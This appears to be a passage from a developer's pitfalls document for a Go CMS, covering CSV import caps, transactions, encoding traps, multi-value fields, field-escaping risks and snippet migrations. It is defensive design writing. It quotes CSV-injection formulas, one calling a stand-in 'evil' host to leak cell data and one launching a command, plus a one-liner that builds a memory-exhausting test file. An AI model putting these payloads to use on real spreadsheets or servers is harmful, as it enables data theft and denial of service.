`FieldsPerRecord`, `LazyQuotes`, `TrimLeadingSpace`, `ReuseRecord`.

The second governing fact: this project's importers have a strong existing
shape — `bundle.Report` with `Warnings []string`, "always create, never merge",
and hard byte caps (`bundle.MaxMediaBytes`, `MaxManifestBytes`,
`http.MaxBytesReader` in `internal/admin/wordpress.go:25`). Follow it.

---

## Pitfall 10: Go's CSV reader has no limit anywhere

**What goes wrong:**

Three shapes of the same attack, all from an authenticated but not necessarily
trusted editor, on a server with well under a gigabyte to spare:

- **A billion rows.** 200 MB of `a,b\n` repeated is ~20 million pages. Each one
  is a separate `CreatePage` write against a single-writer pool
  (`SetMaxOpenConns(1)`), so the import takes hours, holds the write pool, and
  blocks every other write in the installation — including session writes, which
  means *nobody can sign in* while it runs.
- **A single 2 GB field.** One line: `"` followed by two gigabytes of text and no
  closing quote. `csv.Reader` buffers the entire quoted field looking for the
  close, and the process is killed by the kernel. `MaxValueBytes` (4000) is
  applied by `field.trimTo` *after* the value is in memory — far too late.
- **A million columns.** One header row of a million comma-separated names. The
  column-mapping UI, which is "the whole work" per `offene-punkte.md §4`,
  renders a million `<select>` elements into one HTML page.

**Why it happens:**

Because `csv.NewReader(file)` looks complete. The WXR importer's
`http.MaxBytesReader(w, r.Body, 10<<20)` caps the *upload*, which feels like it
caps everything — it does not cap what an 8 MB gzip-friendly CSV expands to in
rows, and it does not cap a single field within the 10 MB.

**How to avoid — four independent caps, all of them:**

1. `r.Body = http.MaxBytesReader(w, r.Body, N)` — copy the WXR line. A CSV of
   text pages: 10 MB is generous.
2. Wrap the file in `io.LimitReader` before `csv.NewReader`, as a second belt.
3. **A row cap.** `const MaxRows = 5000` (or similar), counted as you read; stop
   and report rather than truncating silently. Sits alongside
   `field.MaxRows = 40` and `field.MaxFields = 60` as an editorial limit, and
   should carry the same kind of comment.
4. **A column cap** and a per-field length check *before* the value is used.
   Reject a header row with more than, say, 100 columns.

Plus: read with `ReuseRecord = true` and `FieldsPerRecord = -1` (see Pitfall 22),
and stream — never `reader.ReadAll()`. `ReadAll` on a large file is the whole
document in memory at once and there is no reason to want it.

**Warning signs:**

- `csv.NewReader(file)` with no `LimitReader` above it.
- `ReadAll()` anywhere.
- The import screen has no stated maximum, so nobody knows one exists.
- RSS during an import of a deliberately nasty file. Build one:
  `python3 -c 'import sys; sys.stdout.write("a,b\n"+"\""+"x"*2_000_000_000)'`.

**Phase to address:** Phase 9, in the first task — the caps go in before the
column mapper, because they are what makes the column mapper safe to write.

---

## Pitfall 11: The half-written import

**What goes wrong:**

`page.CreatePage` (`internal/page/store.go:461`) is a bare
`s.DB.Write.ExecContext` — **no transaction**. `bundle.Import` and the WXR
importer both loop over items calling it once per item. If row 300 of 500 fails —
a required field missing, a slug exhausted, the disk full, the process restarted —
rows 1 to 299 are committed and rows 300 to 500 are not. There is no undo. The
operator re-runs the import and now has 299 duplicates (renamed `-2`, see
Pitfall 12).

**Why it happens:**

Because the existing importers behave this way and it is not obviously wrong for
them: they always create a **brand-new website**, so a failed import can be
recovered by deleting that website. CSV import into an **existing** website has
no such escape hatch, and that is the difference nobody notices.

**How to avoid:**

Pick one, deliberately, and write down which:

- **Preferred: one transaction for the whole import.** `s.DB.Write.BeginTx` — the
  pattern already exists at `page/store.go:547`, `692`, `821`. All-or-nothing.
  The write pool is `SetMaxOpenConns(1)` so a long transaction blocks other
  writes; with the row cap from Pitfall 10 that is bounded and acceptable.
  Requires a `CreatePage` variant that takes a `*sql.Tx`.
- **Or: follow the existing convention and always create a new website**, as the
  WXR importer does ("es entsteht immer eine **neue** Website"). Then a failure
  is recovered by deleting the website. This is the smallest change and is
  consistent — but it is probably not what the operator wants from a CSV of
  twenty products for an existing shop.
- **Or, at minimum: a dry run.** Validate every row first, report every problem,
  and only write when the operator confirms. Given that the mapping screen is
  already the bulk of the work, a preview of the first N rows plus a full
  validation pass is a small addition and is the friendliest answer.

Whichever: **`holzcloud rerender` is a standing warning** in this repo
(`CONCERNS.md`, *Known Bugs*) that a write-loop with no transaction and no
`-dry-run` gate destroys data. Do not add a second one.

**Warning signs:**

- The importer has a `for` loop with `CreatePage` inside and no `BeginTx` above.
- There is no confirmation screen between choosing the file and writing.
- Interrupting an import mid-way (Ctrl-C the server) leaves rows behind.

**Phase to address:** Phase 9.

---

## Pitfall 12: `CreatePage` silently renames colliding slugs

**What goes wrong:**

`page.CreatePage` (`store.go:467–490`) catches the UNIQUE violation on
`(website_id, locale, slug)` and retries with `baseSlug-2`, `baseSlug-3`, up to
`maxSlugAttempts`. It returns success. **The caller is never told the address
changed.**

For the admin form that is a kindness. For an import of 500 rows into an existing
website it is a disaster of a quiet kind: a hundred pages land at addresses
nobody chose, the report says "500 imported", and the operator discovers it weeks
later when a link is wrong. If the CSV is re-imported after a fix, everything
collides again and the site fills with `produkt-2`, `produkt-3`, `produkt-4`.

Two sub-cases, both real:

- **Collision within the file.** Two rows whose titles slugify identically
  ("Grüntee" and "Gruentee"). The WXR importer already guards this with a local
  `slugs map[string]bool` (`internal/admin/wordpress.go:53`) — but that guard
  only knows about the file, not the database.
- **Collision with the database.** Only reachable when importing into an existing
  website, which is exactly what CSV import is for.

And note `UNIQUE(website_id, locale, slug)` (migration 00045:71): a CSV with no
locale column writes every row at the default locale, so re-importing a
translated set into a multilingual site collides in a way the operator will not
predict.

**How to avoid:**

- The importer checks for an existing slug **before** calling `CreatePage`, and
  presents the collision as a decision: skip, overwrite, or import with a new
  address. Do not let `CreatePage`'s silent fallback be the policy.
- Whatever happens, **every** renamed row appears in the report by name:
  `bundle.Report.Warnings` is the right vehicle and its comment already says so
  ("Each one names what was lost and why"). A report that says "500 imported"
  when 100 were renamed is the "silently dropped rows" failure the brief names.
- Count and report three numbers, not one: **created**, **skipped**, **changed**.
  A single "imported: N" is the shape of report that lies.

**Warning signs:**

- The report has one number.
- `SELECT slug FROM pages WHERE slug LIKE '%-2'` after an import returns rows.
- Importing the same file twice doubles the page count instead of doing nothing.

**Phase to address:** Phase 9.

---

## Pitfall 21: CSV injection belongs at export, not at import

**What goes wrong:**

A cell reading `=IMPORTXML("http://evil/"&A1)` or `@SUM(1+1)*cmd|'/c calc'!A0`
is inert as page content — it is text, and it goes through goldmark and
bluemonday like any other text. It becomes dangerous **the moment it is written
back into a CSV or XLSX** and opened in Excel or LibreOffice, where it is
evaluated on the recipient's machine.

Two mistakes are possible and they are opposites:

- **Sanitising at import.** Stripping or prefixing a leading `=` when reading
  corrupts legitimate content: a page about a formula, a product named `-40 °C`,
  a Twitter handle in a field. It also does not help, because the danger is at
  the other end.
- **Forgetting at export.** Every later export path — the bundle exporter, a
  future orders export, a plugin — hands the cell to a spreadsheet.

**How to avoid:**

The project already has the correct answer, in a plugin:
`plugins/kontaktformular/csv.go:113`, `entschaerfen()` prefixes an apostrophe to
any cell beginning with `=`, `+`, `-`, `@`, `0x09` or `0x0d`, with a comment
explaining exactly why. **Lift that function into a shared package** (a small
`internal/csv` is being created anyway) and use it from both places. Two copies
of this rule is two chances for one to be laxer — the same argument the codebase
makes for `field.CheckAll`.

At import: **do not** transform the cell. Store it as typed. Rely on the existing
render chain (goldmark → bluemonday → `template.HTML`) plus CSP, which is what
protects the *web* side.

**Warning signs:**

- `entschaerfen` still exists only in `plugins/kontaktformular/`.
- Any new code that writes CSV without calling it.

**Phase to address:** Phase 9 — extracting `entschaerfen` into `internal/csv`
is a task of its own, and the plugin should then use the shared one.

---

## Pitfall 22: Encoding traps — BOM, Latin-1, and the Swiss semicolon

**What goes wrong:**

Every one of these produces a *wrong* import rather than a *failed* one, which is
the worse outcome.

- **The UTF-8 BOM.** Excel on Windows writes `EF BB BF` at the start of "CSV
  UTF-8". Go's `encoding/csv` does **not** strip it — the docs do not mention BOMs
  at all. The first column's header becomes `﻿Titel` instead of `Titel`, so
  the mapping screen shows a column that looks right and matches nothing. The
  symptom is "the title column imports as empty" and it takes an hour to find.
- **The semicolon.** Excel and LibreOffice on a Swiss, German, French or Italian
  locale write `;`-separated files and call them CSV, because `,` is the decimal
  separator. This is the *default* for the project's own audience. With
  `Comma: ','` the whole line is read as one field, and the import produces one
  page whose title is the entire row.
- **Latin-1 / Windows-1252.** An older export, or a database dump. Go strings are
  byte sequences and `csv` will happily read invalid UTF-8; it lands in SQLite
  and renders as `Ã¼` on the website. `bluemonday` does not fix it. It is then
  effectively unrecoverable without knowing which rows came from which file.
- **CRLF** is handled: the docs say the reader converts `\r\n` to `\n` and
  silently removes carriage returns before newlines. A **bare** `\r` (classic Mac,
  and some old exports) is not a line terminator to Go, so the entire file is one
  record.
- **Quoted fields containing newlines** work correctly — a multi-line Markdown
  body in a quoted cell is fine — *provided* `LazyQuotes` is left `false`. Turning
  `LazyQuotes` on to "be forgiving" makes an unbalanced quote swallow the rest of
  the file into one field, which is also Pitfall 10's memory case.
- **Ragged rows.** `FieldsPerRecord` defaults to 0, meaning "the first record sets
  the count" — a short row then returns `ErrFieldCount` and, in a naive loop that
  treats any error as fatal, aborts the import at row 47 leaving 46 pages behind
  (Pitfall 11).

**How to avoid:**

- Strip a leading BOM explicitly before handing bytes to `csv.NewReader`. Three
  lines. Also strip it from the first header cell as a belt.
- **Sniff the delimiter** from the header line — count `,` vs `;` vs `\t` in the
  first line and pick the winner — *and* show the detected delimiter on the
  mapping screen with a way to change it. The mapping screen already has to
  exist; the delimiter belongs on it. Do not guess silently.
- **Validate UTF-8 and refuse.** `utf8.Valid` on each record; a file that is not
  UTF-8 is rejected with a message that says so and says what to do ("save as
  CSV UTF-8"). Do **not** transcode heuristically — guessing between
  Windows-1252 and ISO-8859-1 is a coin flip, and a wrong guess is silent
  corruption. Refusing is honest; the project's whole posture is that a clear
  error beats a silently broken page.
- Set `FieldsPerRecord = -1` and handle short/long rows as a **per-row warning**
  in the report, not as a fatal error.
- Leave `LazyQuotes = false`. A malformed file should be reported, not guessed at.
- Normalise text with `strings.ToValidUTF8` only as a last-resort belt after the
  validation, never instead of it.

**Warning signs:**

- The first mapped column is always empty.
- One page whose title is the whole row.
- `Ã¼`, `Ã¤`, `â€"` anywhere on the site after an import.
- The mapping screen does not say which delimiter it found.

**Phase to address:** Phase 9. **Test with a real file exported from a real
Excel on a Swiss locale** — this is squarely the browser-not-tests case.

---

## Pitfall 23 (integration, Phase 9 ∩ Phase 7): the importer writes an encoding the renderer does not read

**What goes wrong:**

Phase 7 creates the first non-string field value (multiple choice). Phase 9
writes field values from a CSV. If the two are built independently, the importer
will invent its own encoding — comma-separated, most likely, because that is what
a CSV cell suggests — while `field.Resolve` reads newline-separated. The result:
a multiple-choice field imported from CSV renders as one option whose name
contains commas. No error anywhere.

The same trap for the other new kinds: a `zeit` cell as `14:30` vs `14:30:00`, a
`bereich` cell as `50 %`, a `datum` cell as `03.09.2026` (Swiss) where
`field.Check` demands `2006-01-02` (`field.go:508`).

**How to avoid:**

- **One function owns the encoding**, in `internal/field`, and both the form
  reader and the CSV importer call it — the same argument the codebase already
  makes for `field.CheckAll` ("Three copies of these rules would be three chances
  for one of them to be laxer than the others, and the lax one is the one that
  gets used"). Name it `field.EncodeMulti` / `field.DecodeMulti` and export it.
- The CSV importer runs every value through `field.Check` / `field.CheckAll`
  before writing, and a failure becomes a per-row warning in the report — not a
  silent write of an unparseable value.
- Phase 7 lands before Phase 9 in the roadmap, and Phase 9's plan names Phase 7's
  encoding function as a dependency.

**Warning signs:**

- `internal/csv` contains `strings.Split(cell, ",")` for a field value.
- An imported multiple-choice field shows one long option in the edit form.

**Phase to address:** Phase 9 primarily; Phase 7 must export the function.
**Roadmap ordering: 7 before 9.**

---

# Phase 7 — Field kinds

The encoding decision is the one that cannot be taken back, because it is
written into every page's `fields` JSON column and there is no replay command
for it (`CONCERNS.md`: derived data has only one replayable producer).

---

## Pitfall 13: `values[0]` — the form reader keeps only the first value

**What goes wrong:**

`internal/admin/page_form.go:149–151`:

```go
if key, ok := strings.CutPrefix(name, "feld_"); ok && key != "" {
    out.Values[key] = values[0]
    continue
}
```

`r.Form` is a `map[string][]string`. A multiple-choice field rendered as a row of
checkboxes all named `feld_sorten` submits **three** values; this line keeps the
first and drops the rest. Silently. The form looks right, the page saves, two of
the three ticks are gone, and the author re-ticks them and saves again with the
same result.

The group path (`parseRowName`, line 160) has the identical `values[0]`.

**Why it happens:**

Because the line has been correct for every field kind that has ever existed —
this is, per `offene-punkte.md §1`, literally "der erste Feldwert, der kein
einzelner String ist". Nothing about the line looks like it is making an
assumption.

**How to avoid:**

- `fieldsFromRequest` must know which keys are multi-valued. But its own comment
  says it deliberately runs **before** the definitions are loaded ("Read by prefix
  rather than by definition list"). So the answer is not "load the defs here" —
  it is: **encode multi-valuedness in the form field name**, e.g. `feld_sorten[]`
  or a parallel marker input, so the reader can tell from the name alone. Keep
  the prefix-reading property; it is load-bearing.
- Whichever shape is chosen, `field.Def.FieldName()` (`field.go:346`) is the one
  place that mints the name and must mint the multi-value form too.
- **The unticked case:** a checkbox group with nothing ticked submits **no key at
  all**. The key never appears in `r.Form`, so `out.Values` has no entry, so
  `field.Clean` (which only copies keys it finds) drops it — which happens to be
  the right outcome. But it is right by accident. Add a hidden `<input
  type="hidden" name="feld_sorten" value="">` sentinel so "the user cleared it"
  is expressed explicitly, and write the test.

**Warning signs:**

- Tick three, save, reload: one tick.
- No test named something like `TestMehrfachauswahlBehaeltAlleWerte`.

**Phase to address:** Phase 7.

---

## Pitfall 14: The multi-value encoding is decided once, forever, in four places

**What goes wrong:**

`field.Values` is `map[string]string` and is serialised straight to JSON into
`pages.fields` (`field.Encode`, `field.go:418`). A multiple-choice value must be
squeezed into that string. `offene-punkte.md §1` already proposes newline-per-value,
matching `SplitChoices`. That is the right instinct; here is what breaks if it is
done carelessly.

- **A delimiter that appears in the data.** Choices are free text typed by the
  operator into a textarea. Newline is the one delimiter that *cannot* appear in
  a choice, because `SplitChoices` (`field.go:614`) splits the options on newline
  in the first place — a choice containing a newline is not expressible. Comma,
  semicolon, pipe and tab are all typeable into a choice label and are all wrong.
  **Newline is the correct choice and the reason is structural, not aesthetic.**
- **"Empty" versus "one empty value".** `""` split on `\n` yields `[""]`, not
  `[]`. Every consumer must special-case the empty string *before* splitting, or
  an unfilled field renders as a list of one empty item and
  `{{if .Page.Felder.sorten}}` in a theme becomes true for an empty field.
- **The truthiness rules already in the code.** `field.Hidden` (`field.go:265`)
  treats `v == "" || v == "0"` as unfilled, and `Resolve`'s `KindBool` case does
  `raw != "" && raw != "0"`. A multi-value field whose single selected option is
  literally named `0` is treated as empty by the condition engine. Rare, but it is
  the kind of thing that surfaces once and is never diagnosed.
- **`MaxValueBytes = 4000` and `trimTo`** (`field.go:494`): `trimTo` truncates by
  **bytes** — `val[:MaxValueBytes]` — which can cut a UTF-8 rune in half *and*,
  for a multi-value string, silently drop the last selections. Truncate whole
  values, not bytes, for a multi-value field.
- **Sorting and filtering.** The list views (`migration 00034_list_views`) and any
  future filter on a field column will do a string comparison on the encoded
  blob. `"a\nb"` and `"b\na"` are different strings for the same selection. Decide
  now that the encoded order is **the order of `Def.Choices`**, canonicalised on
  write, so the same selection always produces the same string.
- **Existing rows predating the encoding.** A field whose kind is *changed* from
  `auswahl` to `mehrfachauswahl` in the admin leaves every stored value as a
  single string with no newline — which decodes to a one-element list. That is
  the correct and forgiving outcome, and it is free, but only if the decoder is
  written as "split on newline, drop empties" rather than "expect a JSON array".
  **This is the decisive argument against a JSON-array encoding**: `field.Decode`
  already has a documented precedent for reading an older shape
  (`field.go:394–410`, "the old flat shape … five lines here instead of a
  migration that rewrites every page's JSON"), and newline-encoding gets that
  backward compatibility for nothing.

**How to avoid:**

- **Newline-separated, in `Def.Choices` order, canonicalised on write, empty
  string means empty list.** Write that sentence as a comment above the encoder
  and in `TEMPLATE-SPEC.md`.
- Exactly two exported functions, `field.EncodeMulti` and `field.DecodeMulti`, and
  **no other code splits on `\n`.** Grep for it in review.
- `Resolve` returns a `[]string` for the kind, so `{{range .Page.Felder.sorten}}`
  works and `{{if}}` is false for empty. `List`/`Entry` needs a matching
  representation, and `Entry.Text` must be a joined, human-readable form.
- Add the kind to `SubKinds()` and `BlockKinds()` deliberately — both are
  computed as "everything minus N" with hard-coded lengths
  (`make([]Kind, 0, len(Kinds)-2)`, `len(Kinds)-3`). Those are capacity hints, so
  a wrong number is harmless, but the `switch` inside `BlockKinds` is the real
  filter and must be reviewed for each new kind.

**Warning signs:**

- Any `strings.Split(v, ",")` on a field value.
- A theme printing `[a b c]` (Go slice formatting) — the `Resolve` case is missing
  and it fell through to `default: out[d.Key] = raw`.
- An empty multi-value field rendering a bullet with nothing in it.

**Phase to address:** Phase 7, first task. Everything else in 7, 8 and 9 depends
on it.

---

## Pitfall 17: A new field kind falls through to a plain text box, silently

**What goes wrong:**

`cmd/holzcloud/templates/admin/field_input.html` is a chain of
`{{if .Is "…"}} … {{else if .Is "…"}} … {{else}}` and the final `{{else}}` is:

```html
<input type="text" id="{{.Name}}" name="{{.Name}}" class="form-input" value="{{.Value}}">
```

A kind added to `field.Kinds` in Go but **not** given a branch here renders as a
plain text box. No error, no panic, no test failure. The field appears in the
form, accepts input, saves, and renders — it is just the wrong control. An author
typing `14:30` into what should be a time picker will not report a bug; they will
adapt.

Worse: `.Is "zeit"` compares against a **string literal in the template**. A typo
(`"ziet"`) falls into the same silent `{{else}}`. There is no compile-time link
between `field.KindTime` in Go and `"zeit"` in the template.

**How to avoid:**

- A table-driven test asserting that **every** kind in `field.Kinds` renders a
  control the fallback would not produce. The cheapest reliable form: render
  `field_input` for each kind and assert the output contains a kind-specific
  marker (`type="time"`, `type="range"`, `class="form-code"`, `type="checkbox"`
  for the button row), and that no kind other than `text` and `link` produces the
  bare fallback. This test costs twenty lines and closes the whole class.
- Consider making the fallback loud: `{{else}}` renders the text box **and** a
  visible hint "unbekannte Feldart: {{.Def.Kind}}". The codebase already accepts
  unknown kinds gracefully by design (`KindName` returns the raw value for "a
  field defined by an older version"), so it must not error — but it can say so.
- The same silent-fallback exists in `internal/admin/page_fields.go:186`,
  `switchOf`, whose `default:` returns `"text"` — see the next pitfall.

**Warning signs:**

- A new kind's control looks identical to `text` in the browser. **Open the form
  and look at each new field.** This is the two-minute browser pass that the
  project's own lesson demands.
- `field_input.html` has more `{{else if}}` branches than the Go `Kinds` slice
  has entries, or fewer.

**Phase to address:** Phase 7.

---

## Pitfall 18: A new kind breaks the CSS-only field-condition rule, and nothing says so

**What goes wrong:**

Field conditions ("show this field once that one is filled in") are implemented
**in CSS with no JavaScript** — `cmd/holzcloud/assets/admin.css:1096–1111`:

```css
.feld-schalter--kreuz:has(> .form-group input[type="checkbox"]:checked) > .feld-abhaengig { display: block; }
.feld-schalter--auswahl:has(> .form-group option[value=""]:checked) > .feld-abhaengig { display: none; }
.feld-schalter--text:has(> .form-group input:placeholder-shown) > .feld-abhaengig,
.feld-schalter--text:has(> .form-group textarea:placeholder-shown) > .feld-abhaengig { display: none; }
```

and `internal/admin/page_fields.go:186`:

```go
func switchOf(kind string) string {
    switch kind {
    case field.KindBool:   return "kreuz"
    case field.KindChoice, field.KindImage, field.KindRef: return "auswahl"
    default:               return "text"
    }
}
```

Every new kind falls into `"text"`, whose rule depends on `:placeholder-shown`.

- **`bereich` (`<input type="range">`) never matches `:placeholder-shown`** — a
  range input has no placeholder. So the dependent field is **always visible**,
  even when the controller is "empty". The condition silently does nothing.
- **`zeit` (`<input type="time">`)** is the same. `field.Def.MayControl`
  (`field.go:220`) already excludes `KindDate` for exactly this reason, with the
  comment "A date input has none of those" — `zeit` and `bereich` belong in that
  same exclusion and nobody will remember unless it is written down.
- **A multiple-choice button row of checkboxes** matches none of the three rules;
  it needs a fourth flavour, e.g.
  `.feld-schalter--mehrfach:has(> .form-group input:checked)`.
- **`code`** rendered as a `<textarea>` works with the existing `--text` rule,
  *provided* the `{{if eq .Switch "text"}}placeholder=" "{{end}}` attribute is
  carried over to the new element. Forget it and the rule never fires.

**How to avoid:**

- For every new kind, answer three questions **in the plan**, not in review:
  which `switchOf` flavour, does it need a new CSS rule, and does `MayControl`
  need to exclude it?
- Extend `MayControl`'s exclusion list to `KindDate, KindTime, KindRange` in the
  same commit that adds the kinds. `MayControl` is what populates the "hängt ab
  von" dropdown, so excluding a kind there means nobody can build a condition
  that cannot work — which is exactly the stated design ("The screen offers only
  the fields this returns true for, so nobody has to know the rule to avoid
  breaking it").
- The `field_conditions` behaviour is CSS-only and therefore **only testable in a
  browser**. Add a UAT step: create a field with a condition on each new kind and
  watch the dependent field appear and disappear.

**Warning signs:**

- A dependent field that is always visible.
- A dependent field that never appears.
- `switchOf` unchanged after adding three kinds.

**Phase to address:** Phase 7.

---

## Pitfall 19: `bereich` always submits a value, so "optional" is not expressible

**What goes wrong:**

`<input type="range">` has no empty state. An enabled range always submits
something — its `value`, defaulting to the midpoint of `min`/`max` if none is
set. A disabled range submits nothing at all (browsers do not submit disabled
controls).

For an *optional* `bereich` field this means:

- **Nothing filled in is indistinguishable from the midpoint.** Every page gets
  `bereich = "50"` whether or not the author ever touched the slider.
  `field.Clean` keeps it (it is non-empty), `Resolve` returns 50, and a theme
  doing `{{with .Page.Felder.schaerfe}}` prints "50" on every page.
- **A required `bereich` can never fail validation**, so `Required` is
  meaningless for it. `field.Check` returns early on `value == ""`, and the value
  is never empty.
- Existing pages created before the field was added have no stored value, so they
  render `Resolve`'s zero — inconsistent with pages saved after.

**How to avoid:**

Pick one and document it:

- **Recommended: a range plus an explicit "nicht angegeben" checkbox** that
  disables the slider. Disabled → nothing submitted → key absent → `Clean` drops
  it → genuinely empty. Costs one checkbox and works without JavaScript **only
  if** the disabling is done by the `:has()`/`:checked` CSS the project already
  uses — a `<fieldset disabled>` cannot be toggled by CSS. Realistically this
  needs a form round-trip or an accepted compromise.
- **Or: declare `bereich` always-has-a-value.** State it in the field's hint
  text, in `TEMPLATE-SPEC.md`, and make `Required` a no-op for it (or refuse to
  offer the Required checkbox for this kind on the field-definition screen — the
  cleanest signal).
- **Or: render it as a number input with a slider beside it**, so "empty" is
  expressible. Least elegant, most honest.

The decision matters beyond the form: it determines what a theme sees and what
the CSV importer must write for a blank cell.

**Warning signs:**

- Every page shows the same slider value.
- The "Pflichtfeld" checkbox is offered for a `bereich` field.
- `TEMPLATE-SPEC.md` does not say what an unfilled `bereich` resolves to.

**Phase to address:** Phase 7.

---

## Pitfall 20: `code` meets `safeHTML` in an uploaded theme

**What goes wrong:**

The `code` field's purpose is "a text field without Markdown, in a fixed-width
font" (`offene-punkte.md §6`). An author will put HTML in it. The question is
where escaping is enforced.

**Where it is actually enforced:** `field.Resolve`'s `default` branch
(`internal/field/render.go:156`) returns the raw `string`. Go's `html/template`
escapes a `string` on output. So `{{ .Page.Felder.schnipsel }}` in a theme is
**safe** — `<script>` becomes `&lt;script&gt;` and is displayed, which is exactly
what a `code` field should do.

**How one accidentally undoes it:** `internal/template/loader.go:558` exposes
`safeHTML` to **every uploaded theme**:

```go
"safeHTML": func(s string) template.HTML { return template.HTML(s) },
```

Its comment justifies it for `content_html`, which is pre-sanitised by
bluemonday. Nothing restricts it to that. A theme author — often an AI agent
following `TEMPLATE-SPEC.md` literally — who wants the code field to appear "as
written" will reach for `{{ .Page.Felder.schnipsel | safeHTML }}`, and that is a
stored-HTML-injection route straight through the front door, past bluemonday
(which is never applied to field values at all — only page and snippet Markdown
goes through it).

Three more ways to undo it:

- Returning `template.HTML` from `Resolve` for the `code` kind "so it renders
  properly". Do not.
- `Entry.Text` (`render.go:180`) being consumed by a theme with `safeHTML` in a
  generic field-list loop — one `safeHTML` in a generic loop unescapes *every*
  field.
- Deciding the field should render *inside* `<pre><code>` and building that HTML
  in Go with string concatenation.

**What CSP does and does not cover:** `publicCSP`
(`internal/web/headers.go:29–37`) is `script-src 'self'` with no `unsafe-inline`,
so an injected `<script>` and an `onerror=` attribute **cannot execute**, and
`form-action 'self'` blocks a credential-harvesting form posting off-site. CSP is
a genuine second wall here, exactly as `CONCERNS.md` says for stored bluemonday
output. What it does **not** stop is HTML injection for defacement, a phishing
overlay built from `style` (`style-src` allows `'unsafe-inline'`), or an
`<iframe src="/admin/">` (`frame-ancestors 'self'` permits same-origin framing).

**How to avoid:**

- **Never** return `template.HTML` for a `code` field. Add a test asserting that
  a `code` value containing `<script>` appears escaped in rendered output.
- Add an explicit paragraph to `internal/tmplspec/TEMPLATE-SPEC.md`: a `code`
  field is **text**, is printed with `{{ }}`, and **must not** be passed through
  `safeHTML`. The spec is what theme authors follow literally — CLAUDE.md says so
  in as many words — so this is the highest-leverage line in the phase.
- Consider narrowing `safeHTML` itself. It is currently a blanket
  `string → template.HTML`. A future hardening (out of scope for v1.6, worth
  recording) is to remove it and expose pre-marked `template.HTML` fields only,
  so a theme has no unescape primitive at all. Note it in `offene-punkte.md`.
- `template.Check` renders an upload against `SampleData` and `MinimalData`
  (`internal/template/sample.go`). Those fixtures must gain a `code` field, and
  its sample value should be something visibly HTML-ish (`<b>fett</b>`) so a
  reviewer eyeballing the check output sees whether it was escaped.

**Warning signs:**

- `grep -rn "safeHTML" templates/ sites/` shows it applied to anything under
  `.Felder`.
- A `code` field renders as bold text instead of showing `<b>fett</b>`.
- `TEMPLATE-SPEC.md` describes the `code` kind without a rendering rule.

**Phase to address:** Phase 7 (with a TEMPLATE-SPEC change and a fixture change
in the same commit — the tests tie the three together and will fail otherwise,
which is the mechanism working as designed).

---

# Phase 8 — Snippets carry fields

The design is settled and correct (`offene-punkte.md §3`): reuse
`page_field_defs` with a `snippet_id` column, not a third field table. Migration
00038 did precisely this for `block_type_id` and is the template to copy. The
pitfalls are in what 00038 also had to touch and what a copy-paste will miss.

---

## Pitfall 15: Adding `snippet_id` without re-drawing the partial unique index

**What goes wrong:**

The current state after 00038:

```sql
CREATE UNIQUE INDEX idx_page_field_defs_kennung_oben
    ON page_field_defs(website_id, kennung)
    WHERE parent_id IS NULL AND block_type_id IS NULL;

CREATE UNIQUE INDEX idx_page_field_defs_kennung_baustein
    ON page_field_defs(block_type_id, kennung)
    WHERE block_type_id IS NOT NULL;
```

Adding `snippet_id` **without touching `…_oben`** means a snippet's field is a
row with `parent_id IS NULL AND block_type_id IS NULL` — so it falls inside
`…_oben`'s partial predicate and shares a namespace with the website's page
fields. A snippet field named `telefon` on a website that already has a page
field named `telefon` fails with a UNIQUE violation. The operator sees "Kennung
schon vergeben" pointing at a field they cannot find, because it is on a
different screen.

Two namespaces are wanted here and 00038 already argued why: `„titel" darf es in
den Seitenfeldern einmal geben und in jeder Bausteinart noch einmal: es sind
getrennte Namensräume`. The same is true of snippets.

**How to avoid:**

Exactly the 00038 shape, one predicate longer:

```sql
DROP INDEX IF EXISTS idx_page_field_defs_kennung_oben;

CREATE UNIQUE INDEX idx_page_field_defs_kennung_oben
    ON page_field_defs(website_id, kennung)
    WHERE parent_id IS NULL AND block_type_id IS NULL AND snippet_id IS NULL;

CREATE UNIQUE INDEX idx_page_field_defs_kennung_baustein_text
    ON page_field_defs(snippet_id, kennung)
    WHERE snippet_id IS NOT NULL;
```

**The good news, and it should be stated in the migration's comment so nobody
panics:** this is an index swap, **not** a table rebuild. The uniqueness has
lived in a standalone index since 00029 precisely so it can be re-drawn.
`offene-punkte.md` says it: "Ein eigener Index dagegen — wie die Eindeutigkeit
der Feldkennung — ist ein Austausch von zwei Zeilen." The table-head CHECK
problem that forced the 00029 rebuild does not apply.

**The column itself:** `ALTER TABLE page_field_defs ADD COLUMN snippet_id INTEGER
REFERENCES snippets(id) ON DELETE CASCADE` — and it **must** default to NULL.
00038's comment states the constraint: SQLite refuses `ADD COLUMN` with
`REFERENCES` and a non-NULL default. NULL is also semantically right: every
existing row belongs to a page or a block kind, not to a snippet.

**The migration-ordering trap:** the new migration's `-- +goose Down` must
restore the index as **00038** left it —
`WHERE parent_id IS NULL AND block_type_id IS NULL` — not as 00029 left it
(`WHERE parent_id IS NULL`). Copy-pasting 00038's Down block wholesale restores
the wrong predicate, and the mistake is invisible until someone rolls back and
then rolls forward. Write the Down by hand and test it: `goose down` then
`goose up`, then `PRAGMA integrity_check` and `PRAGMA foreign_key_check`, against
a real database file — the procedure `offene-punkte.md §7` already prescribes for
the SQLite driver bump.

**Warning signs:**

- Creating a snippet field with a key that exists as a page field errors.
- `.schema page_field_defs` after `down`/`up` differs from before.
- The new migration's Down was pasted rather than written.

**Phase to address:** Phase 8.

---

## Pitfall 16: The five queries that filter by carrier, and the two that do not scope

**What goes wrong:**

`internal/field/store.go` discriminates carriers by hand, in SQL, in several
places. Adding `snippet_id` without amending each is a silent leak:

| Line | Query | What breaks |
|------|-------|-------------|
| **53** | `WHERE website_id = $1 AND block_type_id IS NULL` — the page-fields list | **Every snippet field appears on every page's edit form**, and in the field-definition list. Silent; visible only in the browser. |
| **111** | `WHERE website_id = $1 AND block_type_id = $2` | Needs a `snippet_id`-shaped sibling. |
| **137** | `WHERE website_id = $1 AND block_type_id IS NOT NULL` — all block-kind fields | Fine as is, but the analogous "all snippet fields" query must be written. |
| **217** | `SELECT COUNT(*) FROM page_field_defs WHERE website_id = $1` — the `MaxFields` check | See Pitfall 27. |
| **237–240** | The `INSERT` whose position is `MAX(position)+1 WHERE website_id AND parent_id AND COALESCE(block_type_id,0)` | Without `AND COALESCE(snippet_id,0) = …` a new snippet field gets a position from the page-fields pool, so ordering and the move-up/move-down buttons behave randomly. |
| **179** | `GetByID: WHERE id = $1 AND website_id = $2` | **Scoped by website only.** A snippet field's id, passed to `/admin/websites/{id}/felder/{fieldID}/loeschen`, is fetched and deleted through the *page-field* routes. Not a cross-website leak (the website check holds), but it is a carrier confusion that lets one screen destroy another screen's data. |
| **342** | `DELETE … WHERE id = $1 AND website_id = $2` | Same. |

